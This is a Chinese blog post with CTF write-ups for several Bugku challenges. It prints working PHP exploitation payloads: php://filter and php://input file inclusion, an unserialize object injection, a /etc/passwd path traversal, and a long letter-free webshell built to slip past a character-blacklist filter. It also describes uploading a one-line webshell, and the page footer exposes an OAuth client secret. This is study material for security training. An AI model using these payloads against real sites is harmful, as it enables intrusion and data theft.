<h3 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>txt直接GET传入好像不行</p>
<p><code>include($file)</code>处的包含可以用php://filter获取php页面源码,但是flag.php是读不了的</p>
<p><code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=1</code></p>
<p>hint.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>password则利用反序列化，把Flag的file值赋为flag.php</p>
<p>构造<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><code>file=hint.php</code>里有Flag类</p>
<p>payload： <code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb0334e.png" alt="s29.png"></p>
<h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p><img src="https://i.loli.net/2018/07/29/5b5d2efb3384e.png" alt="s30.png"></p>
<p>没有什么多的提示</p>
<p>python，写个5位字典，burp爆破即可</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb34fd6.png" alt="s31.png"></p>
<p>13579</p>
<p><code>flag{bugku-baopo-hah}</code></p>
<h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>源码里提示1p.html</p>
<p>一个可以的js，里面一段base64，解码之后再urldecode</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>%00使eregi终止，id利用弱类型,字母绕过</p>
<p>payload: <code>?id=a&amp;a=php://input&amp;b=%001111111</code></p>
<p><code>flag{tHis_iS_THe_fLaG}</code></p>
<h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>解压之后六十多个zip包，不是伪加密，也没爆出密码</p>
<p>然后没了头绪，跟wp学一波</p>
<p>果然要crc碰撞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import zipfile</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">def CrackCrc(crc):</span><br><span class="line">    for i in dic:</span><br><span class="line">        for j in dic:</span><br><span class="line">            for p in dic:</span><br><span class="line">                for q in dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    if crc == (binascii.crc32(s) &amp; 0xffffffff):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        return</span><br><span class="line"> </span><br><span class="line">def CrackZip():</span><br><span class="line">    for I in range(68):</span><br><span class="line">        file = &apos;out&apos; + str(I) + &apos;.zip&apos;</span><br><span class="line">        f = zipfile.ZipFile(file, &apos;r&apos;)</span><br><span class="line">        GetCrc = f.getinfo(&apos;data.txt&apos;)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"> </span><br><span class="line">dic = string.ascii_letters + string.digits + &apos;+/=&apos;</span><br><span class="line"> </span><br><span class="line">f = open(&apos;out.txt&apos;, &apos;w&apos;)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>然后将得到的base64解码，有flag字样，似乎是一个压缩包</p>
<p>这里太坑了，要用notepad++的base64插件解码再保存才能看到RAR文件的结尾标志C43D7B00400700</p>
<p>然后加上标志头526172211A0700，打开</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d68f5246a2.png" alt="s33.png"></p>
<p><code>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</code></p>
<h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片里有着一大段16进制数据</p>
<p>xxd命令处理，在重定向到输出文件</p>
<p>得到坐标</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d7095709da.png" alt="s34.png"></p>
<p>不太会脚本处理，用gnuplot工具输出二维码</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d712c74ffd.png" alt="s35.png"></p>
<p><code>flag{40fc0a979f759c8892f4dc045e28b820}</code></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>看url：<a href="http://120.24.86.145:8002/webshell/" target="_blank" rel="noopener">http://120.24.86.145:8002/webshell/</a></p>
<p>那应该有个shell什么的</p>
<p>果然有个shell.php, 但要密码，整了一个cheetah来shell爆破</p>
<p><a href="https://github.com/sunnyelf/cheetah" target="_blank" rel="noopener">https://github.com/sunnyelf/cheetah</a></p>
<p>一百万的字典没爆出来，可能这不是个真正的shell吧</p>
<p>看wp密码是hack，然后显示flag，果然不是真shell</p>
<p>应该用burp的</p>
<p><code>flag{hack_bug_ku035}</code></p>
<h3 id="流量分析-cnss"><a href="#流量分析-cnss" class="headerlink" title="流量分析(cnss)"></a>流量分析(cnss)</h3><p>数据包很少，但也没什么明显的线索</p>
<p>追踪流的时候总有Referer: <a href="http://space.bilibili.com/17190571/" target="_blank" rel="noopener">http://space.bilibili.com/17190571/</a></p>
<p>进去页面发现base64字符串，解码获取flag</p>
<p><code>cnss{b1libil1_A_gay_wEbsite}</code></p>
<h3 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h3><p>bugku刚上没多久，一开始题目有问题，写入的shell访问不了，然后给admin发了邮件才解决<code>_(:3 」∠)_</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, &quot;On&quot;); </span><br><span class="line">error_reporting(E_ALL | E_STRICT); </span><br><span class="line">if(!isset($_GET[&apos;content&apos;]))&#123; </span><br><span class="line">   show_source(__FILE__); </span><br><span class="line">   die(); </span><br><span class="line">&#125; </span><br><span class="line">function rand_string( $length ) &#123; </span><br><span class="line">   $chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;     </span><br><span class="line">   $size = strlen( $chars ); </span><br><span class="line">   $str = &apos;&apos;; </span><br><span class="line">   for( $i = 0; $i &lt; $length; $i++) &#123; </span><br><span class="line">       $str .= $chars[ rand( 0, $size - 1 ) ]; </span><br><span class="line">   &#125; </span><br><span class="line">   return $str; </span><br><span class="line">&#125; </span><br><span class="line">$data = $_GET[&apos;content&apos;]; </span><br><span class="line">$black_char = array(&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,&apos; &apos;, &apos;!&apos;, &apos;&quot;&apos;, &apos;#&apos;, &apos;%&apos;, &apos;&amp;&apos;, &apos;*&apos;, &apos;,&apos;, &apos;-&apos;, &apos;/&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;:&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;?&apos;, &apos;@&apos;, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;, &apos;\\&apos;, &apos;^&apos;, &apos;`&apos;,  &apos;|&apos;, &apos;~&apos;);</span><br><span class="line">foreach ($black_char as $b) &#123; </span><br><span class="line">   if (stripos($data, $b) !== false)&#123; </span><br><span class="line">       die(&quot;鍏抽敭瀛梂AF&quot;); </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line">$filename=rand_string(0x20).&apos;.php&apos;; </span><br><span class="line">$folder=&apos;uploads/&apos;; </span><br><span class="line">$full_filename = $folder.$filename; </span><br><span class="line">if(file_put_contents($full_filename, &apos;&lt;?php &apos;.$data))&#123; </span><br><span class="line">   echo &quot;&lt;a href=&apos;&quot;.$full_filename.&quot;&apos;&gt;shell&lt;/a&gt;&lt;/br&gt;&quot;; </span><br><span class="line">   echo &quot;鎴戠殑/flag,浣犺鍒颁簡涔�&quot;; </span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;鍣� 鍣�,閿欎簡&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题是github上整理的代码审计中的一道<a href="https://github.com/CHYbeta/Code-Audit-Challenges#php" target="_blank" rel="noopener">https://github.com/CHYbeta/Code-Audit-Challenges#php</a></p>
<p>大佬们的绕过姿势：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p>
<p><a href="http://www.jianshu.com/p/d23d4b1358f2" target="_blank" rel="noopener">php特殊webshell(无数字,字母,位运算)</a></p>
<p><a href="https://chybeta.github.io/2017/07/15/一道好玩的webshell题/" target="_blank" rel="noopener">一道好玩的webshell题</a></p>
<p>其思路就是利用字符串ARRAY获取字符A，利用php的特性，从A递增获得A到Z的各个字母。原webshell存在”修改其webshell</p>
<p><code>+</code>要url编码为%2b</p>
<p><code>http://120.24.86.145:9010/?content=$_=&#39;&#39;;$_[%2b$_]%2b%2b;$_=$_.&#39;&#39;;$__=$_[%2b&#39;&#39;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#39;_&#39;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);</code></p>
<p>获得shell的url后，上菜刀就行</p>
<p><img src="https://i.loli.net/2018/07/31/5b60254b13ea2.png" alt="s1.png"></p>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>pcapng文件，Wireshark打不开，文件错误</p>
<p>对比文件头，没修改成功</p>
<p>直接搜索flag</p>
<p><img src="https://i.loli.net/2018/08/01/5b616683c9373.png" alt="s2.png"></p>
<h3 id="Do-you-know-upload？"><a href="#Do-you-know-upload？" class="headerlink" title="Do you know upload？"></a>Do you know upload？</h3><p>有个提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">include($_GET[&apos;file&apos;]); </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>这里可以用<code>file=../../../../../../../../etc/passwd</code>读文件</p>
<p>并没有找到flag文件</p>
<p>使用<br><code>php://filter/read=convert.base64-encode/resource=index.php</code><br>查看源码</p>
<p>其中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&apos;file&apos;]); </span><br><span class="line">@$pic = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">@$pics = explode(&apos;.&apos; , $pic);</span><br><span class="line"></span><br><span class="line">if(@isset($_POST[submit]))&#123;</span><br><span class="line">    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)))&#123;</span><br><span class="line"></span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">            //echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">                    &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;文件类型不允许&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">        echo &quot;Invalid file&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    // echo &quot;Invalid file&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>抓包修改，上传一句话，在config.php中得到mysql账号</p>
<p>登陆mysql获取flag表中的flag值</p>
<p><code>flag{00e0fb52-6f65-486c-ab4a-4e8b39344940}</code></p>
<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/07/25/ctfs_18_7/">http://j0k3r.top/2018/07/25/ctfs_18_7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/07/inject/"><i class="fa fa-chevron-left">  </i><span>代码审计之SQL注入</span></a></div><div class="next-post pull-right"><a href="/2018/07/24/command-excu/"><span>shell中的正则和通配符&amp;&amp;命令执行漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
  id: md5(decodeURI(location.pathname)),
  owner: 'zhuxianjin',
  repo: 'zhuxianjin.github.io',
  oauth: {
    client_id: '7b59169c6ede61f26021',
    client_secret: 'ab44e9406b9214e664d133180ad8e54f696d169d'
  }
})
gitment.render('gitment-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2019/07/31/5d41a1019cdd085371.png)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/null"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>